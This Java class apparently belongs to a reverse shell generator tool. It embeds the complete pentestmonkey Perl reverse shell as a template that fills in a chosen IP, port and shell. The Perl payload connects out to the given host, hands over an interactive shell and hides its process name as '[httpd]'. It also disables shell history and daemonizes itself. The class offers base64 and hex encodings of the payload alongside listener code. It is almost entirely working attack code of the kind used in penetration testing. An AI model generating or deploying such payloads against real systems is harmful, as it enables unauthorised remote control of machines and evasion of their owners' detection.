package com.iteso.ReverseShellGenerator.Reverse.Shells;
import com.iteso.ReverseShellGenerator.DEncoder;
import com.iteso.ReverseShellGenerator.Reverse.Reverse;

public class PerlPentestMonkey extends Reverse {

    protected String shellFormat = "";

    public PerlPentestMonkey(String localIP, int localPort, LISTENER listener, SHELLS shellType){
        super(localIP, localPort, listener, shellType);
        shellFormat = String.format("#!/usr/bin/perl -w\n" + //
                "# perl-reverse-shell - A Reverse Shell implementation in PERL\n" + //
                "# Copyright (C) 2006 pentestmonkeypentestmonkey.net\n" + //
                "#\n" + //
                "# This tool may be used for legal purposes only.  Users take full responsibility\n" + //
                "# for any actions performed using this tool.  The author accepts no liability\n" + //
                "# for damage caused by this tool.  If these terms are not acceptable to you, then\n" + //
                "# do not use this tool.\n" + //
                "#\n" + //
                "# In all other respects the GPL version 2 applies:\n" + //
                "#\n" + //
                "# This program is free software; you can redistribute it and/or modify\n" + //
                "# it under the terms of the GNU General Public License version 2 as\\\n" + //
                "# published by the Free Software Foundation.\n" + //
                "#\n" + //
                "# This program is distributed in the hope that it will be useful,\n" + //
                "# but WITHOUT ANY WARRANTY; without even the implied warranty of\n" + //
                "# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n" + //
                "# GNU General Public License for more details.\n" + //
                "#\n" + //
                "# You should have received a copy of the GNU General Public License along\n" + //
                "# with this program; if not, write to the Free Software Foundation, Inc.,\n" + //
                "# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.\n" + //
                "#\n" + //
                "# This tool may be used for legal purposes only.  Users take full responsibility\n" + //
                "# for any actions performed using this tool.  If these terms are not acceptable to\n" + //
                "# you, then do not use this tool.\n" + //
                "#\n" + //
                "# You are encouraged to send comments, improvements or suggestions to\n" + //
                "# me at pentestmonkeypentestmonkey.net\n" + //
                "#\n" + //
                "# Description\n" + //
                "# -----------\n" + //
                "# This script will make an outbound TCP connection to a hardcoded IP and port.\n" + //
                "# The recipient will be given a shell running as the current user (apache normally).\n" + //
                "#\n" + //
                "\n" + //
                "use strict;\n" + //
                "use Socket;\n" + //
                "use FileHandle;\n" + //
                "use POSIX;\n" + //
                "my $VERSION = \"1.0\";\n" + //
                "\n" + //
                "# Where to send the reverse shell.  Change these.\n" + //
                "my $ip = '%s';\n" + //
                "my $port = %s;\n" + //
                "\n" + //
                "# Options\n" + //
                "my $daemon = 1;\n" + //
                "my $auth   = 0; # 0 means authentication is disabled and any \n" + //
                "\t\t# source IP can access the reverse shell\n" + //
                "my $authorised_client_pattern = qr(^127\\\\.0\\\\.0\\\\.1$);\n" + //
                "\n" + //
                "# Declarations\n" + //
                "my $global_page = \"\";\n" + //
                "my $fake_process_name = \"/usr/sbin/apache\";\n" + //
                "\n" + //
                "# Change the process name to be less conspicious\n" + //
                "$0 = \"[httpd]\";\n" + //
                "\n" + //
                "# Authenticate based on source IP address if required\n" + //
                "if (defined($ENV{'REMOTE_ADDR'})) {\n" + //
                "\tcgiprint(\"Browser IP address appears to be: $ENV{'REMOTE_ADDR'}\");\n" + //
                "\n" + //
                "\tif ($auth) {\n" + //
                "\t\tunless ($ENV{'REMOTE_ADDR'} =~ $authorised_client_pattern) {\n" + //
                "\t\t\tcgiprint(\"ERROR: Your client isn't authorised to view this page\");\n" + //
                "\t\t\tcgiexit();\n" + //
                "\t\t}\n" + //
                "\t}\n" + //
                "} elsif ($auth) {\n" + //
                "\tcgiprint(\"ERROR: Authentication is enabled, but I couldn't determine your IP address.  Denying access\");\n" + //
                "\tcgiexit(0);\n" + //
                "}\n" + //
                "\n" + //
                "# Background and dissociate from parent process if required\n" + //
                "if ($daemon) {\n" + //
                "\tmy $pid = fork();\n" + //
                "\tif ($pid) {\n" + //
                "\t\tcgiexit(0); # parent exits\n" + //
                "\t}\n" + //
                "\n" + //
                "\tsetsid();\n" + //
                "\tchdir('/');\n" + //
                "\tumask(0);\n" + //
                "}\n" + //
                "\n" + //
                "# Make TCP connection for reverse shell\n" + //
                "socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));\n" + //
                "if (connect(SOCK, sockaddr_in($port,inet_aton($ip)))) {\n" + //
                "\tcgiprint(\"Sent reverse shell to $ip:$port\");\n" + //
                "\tcgiprintpage();\n" + //
                "} else {\n" + //
                "\tcgiprint(\"Couldn't open reverse shell to $ip:$port: $!\");\n" + //
                "\tcgiexit();\t\n" + //
                "}\n" + //
                "\n" + //
                "# Redirect STDIN, STDOUT and STDERR to the TCP connection\n" + //
                "open(STDIN, \">&SOCK\");\n" + //
                "open(STDOUT,\r\n" + //
                "\">&SOCK\");\n" + //
                "open(STDERR,\r\n" + //
                "\">&SOCK\");\n" + //
                "$ENV{'HISTFILE'} = '/dev/null';\n" + //
                "system(\"w;uname -a;id;pwd\");\n" + //
                "exec({\"%s\"} ($fake_process_name, \"-i\"));\n" + //
                "\n" + //
                "# Wrapper around print\n" + //
                "sub cgiprint {\n" + //
                "\tmy $line = shift;\n" + //
                "\t$line .= \"<p>\n" + //
                "\";\n" + //
                "\t$global_page .= $line;\n" + //
                "}\n" + //
                "\n" + //
                "# Wrapper around exit\n" + //
                "sub cgiexit {\n" + //
                "\tcgiprintpage();\n" + //
                "\texit 0; # 0 to ensure we don't give a 500 response.\n" + //
                "}\n" + //
                "\n" + //
                "# Form HTTP response using all the messages gathered by cgiprint so far\n" + //
                "sub cgiprintpage {\n" + //
                "\tprint \"Content-Length: \" . length($global_page) . \"\\r\n" + //
                "Connection: close\\r\n" + //
                "Content-Type: text\\/html\\r\\n" + //
                "\\r\\n\n" + //
                "\" . $global_page;\n" + //
                "}\n" + //
                "",this.getLocalIP(), this.getLocalPort(), this.getShell());
    }

    @Override
    public String getShellCode(){
        return shellFormat;
    }

    @Override
    public String toString(){
        return "{" + "\"parameters\": " + super.toString() + "," +
                    "\"reverse_listener_code\": " + "\"" + super.getListenerCode() + "\"," +
                    "\"reverse_shell_code\": " + "\"" + getShellCode() + "\"," +
                    "\"reverse_shell_code_b64\": " + "\"" + DEncoder.encodeToBase64(getShellCode()) + "\"," +
                    "\"reverse_shell_code_hex\": " + "\"" + DEncoder.encodeToHex(getShellCode()) + "\"" +
                "}";
    }
    
} 
    